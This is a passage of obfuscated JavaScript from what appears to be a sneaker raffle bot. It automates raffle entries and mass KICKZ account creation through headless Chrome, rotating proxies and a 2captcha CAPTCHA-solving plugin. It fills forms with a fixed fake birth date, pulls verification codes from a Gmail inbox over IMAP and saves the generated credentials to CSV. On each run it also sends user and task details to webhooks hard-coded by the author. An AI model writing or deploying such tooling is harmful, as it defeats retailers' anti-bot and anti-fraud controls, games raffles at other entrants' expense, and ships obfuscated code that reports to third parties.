                        'succesPUBMSG': { 'embeds': [_0x3b52a5] }
                    };
                    if (_0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '')
                        try {
                            await _0x161ab9(_0x4a0109['webhook'], _0x1b2b54['succesDEVMSG']);
                        } catch {
                        }
                    await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0x1b2b54['succesDEVMSG']), await _0x41ff52(0xc8);
                    try {
                        await _0x161ab9(_0x17a127, _0x1b2b54['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x234adc[_0x338d9f]['Email'] == '' || _0x234adc[_0x338d9f]['Url'] == '' || _0x234adc[_0x338d9f]['FirstName'] == '' || _0x234adc[_0x338d9f]['LastName'] == '') {
                        console['log'](_0x2fd7e7() + '\x20[' + _0x6f29e[taskModule]['name'] + ']\x20Task\x20' + (_0x338d9f + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x4a0109['useRandomProxy'] = ![])
                        var _0xda7a88 = _0x5773b0[_0x338d9f]['split'](':');
                    else
                        var _0x2e061b = Math['round'](Math['random']() * (_0x5773b0['length'] - 0x1)), _0xda7a88 = _0x5773b0[_0x2e061b]['split'](':');
                    var _0x43d825;
                    try {
                        _0x43d825 = await _0x3ad8ba['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xda7a88[0x0] + ':' + _0xda7a88[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x43d825 = await _0x3ad8ba['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xda7a88[0x0] + ':' + _0xda7a88[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0xb7853f = await _0x43d825['newPage']();
                        await _0xb7853f['authenticate']({
                            'username': '' + _0xda7a88[0x2],
                            'password': '' + _0xda7a88[0x3]
                        }), console['log'](_0x2fd7e7() + '\x20[' + _0x38f429['name'] + ']\x20Task\x20' + (_0x338d9f + 0x1) + '\x20:\x20Getting\x20Session'), await _0xb7853f['setRequestInterception'](!![]), _0xb7853f['on']('request', _0x3a0d31 => {
                            _0x3a0d31['resourceType']() === 'image' || _0x3a0d31['resourceType']() === 'font' || _0x3a0d31['resourceType']() === 'media' ? _0x3a0d31['abort']() : _0x3a0d31['continue']();
                        });
                        try {
                            await _0xb7853f['goto']('' + _0x234adc[_0x338d9f]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0xb7853f['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x2fd7e7() + '\x20[' + _0x38f429['name'] + ']\x20Task\x20' + (_0x338d9f + 0x1) + '\x20:\x20Filling\x20Information'), await _0xb7853f['type']('#comp_firstname', '' + _0x234adc[_0x338d9f]['FirstName']), await _0xb7853f['waitForSelector']('#comp_lastname'), await _0xb7853f['type']('#comp_lastname', '' + _0x234adc[_0x338d9f]['LastName']), await _0xb7853f['waitForSelector']('#comp_email'), await _0xb7853f['type']('#comp_email', '' + _0x234adc[_0x338d9f]['Email']), await _0xb7853f['waitForSelector']('#comp_paypalemail'), await _0xb7853f['type']('#comp_paypalemail', '' + _0x234adc[_0x338d9f]['Email']), await _0xb7853f['waitForSelector']('#comp_mobile_end'), await _0xb7853f['type']('#comp_mobile_end', '' + _0x234adc[_0x338d9f]['Phone']), await _0xb7853f['waitForSelector']('#comp_dob'), await _0xb7853f['type']('#comp_dob', '08/09/1992'), console['log'](_0x2fd7e7() + '\x20[' + _0x38f429['name'] + ']\x20Task\x20' + (_0x338d9f + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x234adc[_0x338d9f]['Size'] == 'RANDOM') {
                            const _0x35834c = await _0xb7853f['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3f65d7 => {
                                return _0x3f65d7['map'](_0x5e21df => _0x5e21df['value']);
                            });
                            var _0x2ba42d = Math['round'](Math['random']() * (_0x35834c['length'] - 0x2));
                            await _0xb7853f['select']('#shoesize', _0x35834c[_0x2ba42d + 0x1]), await _0x41ff52(0x3e8);
                        } else {
                            const _0x1a8b87 = await _0xb7853f['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2a716c => {
                                return _0x2a716c['map'](_0x53a8e4 => _0x53a8e4['innerText']);
                            }), _0x116afa = await _0xb7853f['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3e469b => {
                                return _0x3e469b['map'](_0x4a289f => _0x4a289f['value']);
                            });
                            var _0x52fcb0 = _0x234adc[_0x338d9f]['Size'];
                            for (var _0x1d2341 = 0x1; _0x1d2341 < _0x116afa['length']; _0x1d2341++) {
                                var _0x4c4abf = _0x1a8b87[_0x1d2341]['split']('\x20')[0x0];
                                if (_0x4c4abf == _0x52fcb0) {
                                    await _0xb7853f['select']('#shoesize', _0x116afa[_0x1d2341]);
                                    break;
                                } else {
                                    if (_0x1d2341 + 0x1 == _0x116afa['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0xb7853f['waitForSelector']('#comp_address1'), await _0xb7853f['type']('#comp_address1', _0x234adc[_0x338d9f]['Address1'] + '\x20' + _0x234adc[_0x338d9f]['HouseNumber']), await _0xb7853f['waitForSelector']('#comp_address2'), await _0xb7853f['type']('#comp_address2', '' + _0x234adc[_0x338d9f]['Address2']), await _0xb7853f['waitForSelector']('#comp_address2'), await _0xb7853f['type']('#comp_address3', '' + _0x234adc[_0x338d9f]['City']), await _0xb7853f['waitForSelector']('#comp_postcode'), await _0xb7853f['type']('#comp_postcode', '' + _0x234adc[_0x338d9f]['Zip']), console['log'](_0x2fd7e7() + '\x20[' + _0x38f429['name'] + ']\x20Task\x20' + (_0x338d9f + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x41ff52(0x4b0), await _0xb7853f['click']('label#emailhold'), await _0x41ff52(0x5dc), await _0xb7853f['click']('#preauth_tandc_email\x20>\x20label'), await _0x41ff52(0x5dc), await _0xb7853f['click']('#submit');
                        try {
                            await _0xb7853f['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x2fd7e7() + '\x20[' + _0x38f429['name'] + ']\x20Task\x20' + (_0x338d9f + 0x1) + '\x20:\x20' + _0xe8dd24['blue']('Awaiting\x20Paypal\x20Payment')), _0x43d825['on']('targetcreated', async _0x41bc3e => {
                            if (_0x41bc3e['type']() === 'page') {
                                const _0x19e402 = await _0x41bc3e['page']();
                                async function _0x23a8a9() {
                                    try {
                                        await _0xb7853f['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x3e0b6c = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x2952ba() {
                                    try {
                                        await _0xb7853f['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x3ea625 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x2952ba(), _0x23a8a9(), await _0x41ff52(0x493e0);
                            }
                        });
                        async function _0x4b0184() {
                            for (let _0x46a4a4 = 0x0; _0x46a4a4 < 0x12c; _0x46a4a4++) {
                                if (_0x3ea625 == !![]) {
                                    _0x1289b1 = 'no', _0xe72aef(_0x234adc[_0x338d9f], _0x38f429), console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x38f429['name'] + ']\x20Task\x20' + (_0x338d9f + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '')
                                        try {
                                            await _0x161ab9(_0x4a0109['webhook'], _0x1b2b54['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0x1b2b54['succesDEVMSG']), await _0x41ff52(0xc8);
                                    try {
                                        await _0x161ab9(_0x17a127, _0x1b2b54['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x3e0b6c)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x41ff52(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x41ff52(0xbb8), await _0xb7853f['click']('.zoid-outlet'), await _0x41ff52(0x7d0), await _0x4b0184();
                    } catch (_0x5b6c09) {
                        console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x38f429['name'] + ']\x20Task\x20' + (_0x338d9f + 0x1) + '\x20:\x20' + _0x5b6c09)), _0x3daf4b = '' + _0x5b6c09;
                        var _0x216b27 = await _0x17c0a2(_0x234adc[_0x338d9f], _0x38f429, 'dev', !![], _0x3daf4b);
                        _0x1b2b54['errorDEV'] = { 'embeds': [_0x216b27] }, _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x1b2b54['errorDEV']), await _0x161ab9(_0x11ee4c, _0x1b2b54['errorDEV']);
                    } finally {
                        _0x43d825 && _0x43d825['close']();
                        if (_0x1289b1 == 'yes' && _0x10d1db != 0x5 && _0x3daf4b != 'Size\x20Not\x20Found') {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x38f429['name'] + ']\x20Task\x20' + (_0x338d9f + 0x1) + '\x20:\x20Retrying\x20(' + _0x10d1db + '\x20/\x205)')), _0x338d9f = _0x338d9f - 0x1, _0x10d1db = _0x10d1db + 0x1;
                            continue;
                        }
                        _0x1289b1 == 'yes' && _0x10d1db >= 0x5 && (_0x53e25e(afew[_0x338d9f], _0x38f429), _0x1289b1 = 'no', _0x10d1db = 0x0), console['log']('Waiting\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x5dc709, _0x28a746, _0x5938e1) {
                    _0x3ad8ba['use'](_0x36d6c8()), _0x3ad8ba['use'](_0x541303({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a0109['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xb8e1a9 = 0x0; _0xb8e1a9 < _0x28a746['length']; _0xb8e1a9++) {
                        const _0x19c5ec = 'https://www.kickz.com/login';
                        if (_0x1a50c5 != 'yes')
                            var _0x1a50c5 = '', _0x3940b5 = 0x0;
                        _0x3a603f(_0x5dc709['name'] + '\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20/\x20' + _0x28a746['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4);
                        try {
                            await _0x547a29(_0x28a746, _0xb8e1a9);
                        } catch {
                            _0x1a50c5 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x413bce = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4f2583
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4a0109['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5192c8
                                }
                            ]
                        }];
                        const _0x4ec759 = { 'embeds': _0x413bce };
                        var _0xd1d501 = await _0x17c0a2(_0x28a746[_0xb8e1a9], _0x5dc709, 'acc', ![]);
                        const _0x5b82ac = { 'succesDEVMSG': { 'embeds': [_0xd1d501] } };
                        if (_0x28a746[_0xb8e1a9]['Email'] == '' || _0x28a746[_0xb8e1a9]['FirstName'] == '' || _0x28a746[_0xb8e1a9]['LastName'] == '') {
                            console['log'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x28a746[_0xb8e1a9]['Password'] == '' && (_0x28a746[_0xb8e1a9]['Password'] = 'JRaffles23!');
                        if (_0x4a0109['useRandomProxy'] = ![])
                            var _0x1640f3 = _0x5938e1[_0xb8e1a9]['split'](':');
                        else
                            var _0x165d7c = Math['round'](Math['random']() * (_0x5938e1['length'] - 0x1)), _0x1640f3 = _0x5938e1[_0x165d7c]['split'](':');
                        var _0xdfe744;
                        try {
                            _0xdfe744 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1640f3[0x0] + ':' + _0x1640f3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xdfe744 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1640f3[0x0] + ':' + _0x1640f3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3bed47 = await _0xdfe744['newPage']();
                            await _0x3bed47['authenticate']({
                                'username': '' + _0x1640f3[0x2],
                                'password': '' + _0x1640f3[0x3]
                            }), console['log'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3bed47['setRequestInterception'](!![]), _0x3bed47['on']('request', _0x4a4369 => {
                                _0x4a4369['resourceType']() === 'image' || _0x4a4369['resourceType']() === 'font' || _0x4a4369['resourceType']() === 'media' ? _0x4a4369['abort']() : _0x4a4369['continue']();
                            }), await _0x3bed47['goto'](_0x19c5ec), await _0x41ff52(0xbb8), console['log'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x3bed47['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x3bed47['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x3bed47['waitForSelector']('#button-register'), await _0x41ff52(0x7d0), await _0x3bed47['evaluate'](() => {
                                const _0x15001d = document['querySelector']('#button-register');
                                _0x15001d['click']();
                            }), console['log'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x41ff52(0x1388), await _0x3bed47['waitForSelector']('#customer_salutation'), await _0x3bed47['select']('#customer_salutation', 'mr'), await _0x41ff52(0x7d0), await _0x3bed47['waitForSelector']('#customer_firstname'), await _0x3bed47['type']('#customer_firstname', '' + _0x28a746[_0xb8e1a9]['FirstName']), await _0x41ff52(0x352), await _0x3bed47['waitForSelector']('#customer_lastname'), await _0x3bed47['type']('#customer_lastname', '' + _0x28a746[_0xb8e1a9]['LastName']), await _0x41ff52(0x352), await _0x3bed47['type']('#email-input', '' + _0x28a746[_0xb8e1a9]['Email']), await _0x41ff52(0x352), await _0x3bed47['type']('#email-confirm-input', '' + _0x28a746[_0xb8e1a9]['Email']), await _0x41ff52(0x352), await _0x3bed47['type']('#register-password', '' + _0x28a746[_0xb8e1a9]['Password']), await _0x41ff52(0x352), await _0x3bed47['type']('#password-confirm', '' + _0x28a746[_0xb8e1a9]['Password']), await _0x41ff52(0x352), console['log'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x3bed47['click']('#consent'), await _0x41ff52(0x1f4);
                            const _0x54a1bc = await _0x3bed47['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x54a1bc) {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x3bed47['click']('#buttonRegister');
                            try {
                                await _0x3bed47['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x28a746[_0xb8e1a9]['Email']), await _0x41ff52(0x4b0);
                            async function _0x447ae7() {
                                var _0x5219a9, _0x9006ae = ![];
                                for (var _0x3f4466 = 0x0; _0x3f4466 < 0x18; _0x3f4466++) {
                                    async function _0x2a910a() {
                                        var _0x230ae7 = new _0x2b7859({
                                            'user': _0x4a0109['masterMail'],
                                            'password': _0x4a0109['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0xf8a4f6(_0xa500a2) {
                                            _0x230ae7['openBox']('INBOX', ![], _0xa500a2);
                                        }
                                        _0x230ae7['once']('ready', function () {
                                            console['log'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0xf8a4f6(function (_0x31127d, _0x4f6552) {
                                                console['log'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x31127d)
                                                    throw _0x31127d;
                                                _0x230ae7['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x315bb9, _0x17c39e) {
                                                    if (!_0x17c39e || !_0x17c39e['length'])
                                                        console['log'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x230ae7['end']();
                                                    else {
                                                        var _0x102fc3 = _0x230ae7['seq']['fetch'](_0x17c39e, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x102fc3['on']('message', function (_0x5d849c, _0xa3b0bb) {
                                                            var _0x3ae198 = '(#' + _0xa3b0bb + ')\x20';
                                                            _0x5d849c['on']('body', function (_0x177ef4, _0x43646c) {
                                                                _0x186dbf(_0x177ef4, (_0x3b12e4, _0x46f6a7) => {
                                                                    if (_0x46f6a7['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x247bf4 = _0x46f6a7['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x96b7f = _0x247bf4[0x1]['split']('<')[0x0];
                                                                        _0x5219a9 = _0x96b7f;
                                                                    }
                                                                });
                                                            }), _0x5d849c['once']('end', function () {
                                                            });
                                                        }), _0x102fc3['once']('error', function (_0x3c7dcd) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x102fc3['once']('end', function () {
                                                            _0x230ae7['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x230ae7['once']('error', function (_0x60b8e9) {
                                            console['log'](_0xe8dd24['red'](_0x60b8e9['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x9006ae = !![];
                                        }), _0x230ae7['once']('end', async function () {
                                        }), _0x230ae7['connect']();
                                    }
                                    _0x2a910a(), await _0x41ff52(0x1388);
                                    if (_0x5219a9)
                                        return _0x5219a9;
                                    if (_0x9006ae)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x3f4466 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x447ae7(), _0x41ff52(0x320), console['log'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20Verifying..'), await _0x3bed47['type']('#verificationCode', code), await _0x41ff52(0x1f4), await _0x3bed47['click']('#buttonVerify'), await _0x41ff52(0x190), await _0x3bed47['click']('#buttonVerify'), await _0x41ff52(0x3e8);
                            try {
                                await _0x3bed47['waitForSelector']('div.b-user_greeting'), _0x1a50c5 = 'no', console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20Account\x20' + _0x28a746[_0xb8e1a9]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x144018['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x28a746[_0xb8e1a9]['Email'] + ',' + _0x28a746[_0xb8e1a9]['Password'] + ','), console['log'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20Account\x20' + _0x28a746[_0xb8e1a9]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x5b82ac['succesDEVMSG']);
                                } catch {
                                }
                                await _0x161ab9(_0x2467e3, _0x5b82ac['succesDEVMSG']);
                            } catch {
                                _0x1a50c5 = 'no', console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0xc05769) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20' + _0xc05769)), _0x413bce[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x413bce[0x0]['description'] = '' + _0xc05769, await _0x161ab9(_0x11ee4c, _0x4ec759), _0x1a50c5 = 'yes';
                        } finally {
                            _0xdfe744 && _0xdfe744['close']();
                            if (_0x1a50c5 == 'yes' && _0x3940b5 != 0x5) {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x5dc709['name'] + ']\x20Task\x20' + (_0xb8e1a9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3940b5 + '\x20/\x205)')), _0xb8e1a9 = _0xb8e1a9 - 0x1, _0x3940b5 = _0x3940b5 + 0x1;
                                continue;
                            }
                            _0x1a50c5 == 'yes' && _0x3940b5 >= 0x5 && (_0x53e25e(_0x28a746[_0xb8e1a9], _0x5dc709), _0x1a50c5 = 'no', _0x3940b5 = 0x0), console['log']('Waiting\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x389474, _0x5a3b66, _0x314579) {
                    _0x3ad8ba['use'](_0x36d6c8()), _0x3ad8ba['use'](_0x541303({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a0109['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3d7f8b = 0x0; _0x3d7f8b < _0x5a3b66['length']; _0x3d7f8b++) {
                        var _0x2679a2;
                        if (_0xbbe71a != 'yes')
                            var _0xbbe71a = '', _0x2e8519 = 0x0;
                        _0x3a603f(_0x389474['name'] + '\x20Task\x20' + (_0x3d7f8b + 0x1) + '\x20/\x20' + _0x5a3b66['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4);
                        var _0x3fcb2f = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4f2583
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x5a3b66[_0x3d7f8b]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x5a3b66[_0x3d7f8b]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4a0109['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5192c8
                                }
                            ]
                        }], _0x50dc38 = await _0x17c0a2(_0x5a3b66[_0x3d7f8b], _0x389474, 'dev', ![]), _0x2d27f1 = await _0x17c0a2(_0x5a3b66[_0x3d7f8b], _0x389474, 'pub', ![]);
                        const _0x3f6d6d = {
                            'succesDEVMSG': { 'embeds': [_0x50dc38] },
                            'succesPUBMSG': { 'embeds': [_0x2d27f1] }
                        };
                        try {
                            await _0x547a29(_0x5a3b66, _0x3d7f8b);
                        } catch {
                            _0xbbe71a = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x5a3b66[_0x3d7f8b]['Email'] == '' || _0x5a3b66[_0x3d7f8b]['Password'] == '' || _0x5a3b66[_0x3d7f8b]['FirstName'] == '' || _0x5a3b66[_0x3d7f8b]['LastName'] == '') {
                            console['log'](_0x2fd7e7() + '\x20[' + _0x389474['name'] + ']\x20Task\x20' + (_0x3d7f8b + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4a0109['useRandomProxy'] = ![])
                            var _0x386f51 = _0x314579[_0x3d7f8b]['split'](':');
                        else
                            var _0x33a4e0 = Math['round'](Math['random']() * (_0x314579['length'] - 0x1)), _0x386f51 = _0x314579[_0x33a4e0]['split'](':');
                        var _0x440305;
                        try {
                            _0x440305 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x386f51[0x0] + ':' + _0x386f51[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x440305 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x386f51[0x0] + ':' + _0x386f51[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x361f79 = await _0x440305['newPage']();
                            await _0x361f79['authenticate']({
                                'username': '' + _0x386f51[0x2],
                                'password': '' + _0x386f51[0x3]
                            }), console['log'](_0x2fd7e7() + '\x20[' + _0x389474['name'] + ']\x20Task\x20' + (_0x3d7f8b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x361f79['setRequestInterception'](!![]), _0x361f79['on']('request', _0x346dce => {
                                _0x346dce['resourceType']() === 'image' || _0x346dce['resourceType']() === 'font' || _0x346dce['resourceType']() === 'media' ? _0x346dce['abort']() : _0x346dce['continue']();
                            }), await _0x361f79['goto']('' + _0x5a3b66[_0x3d7f8b]['Url'], { 'waitUntil': 'networkidle2' }), await _0x41ff52(0x12c), await _0x361f79['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x361f79['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x41ff52(0x7d0);
                            try {
                                await _0x361f79['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x361f79['click']('a[title=\x22sign\x20in\x22]');
                            }
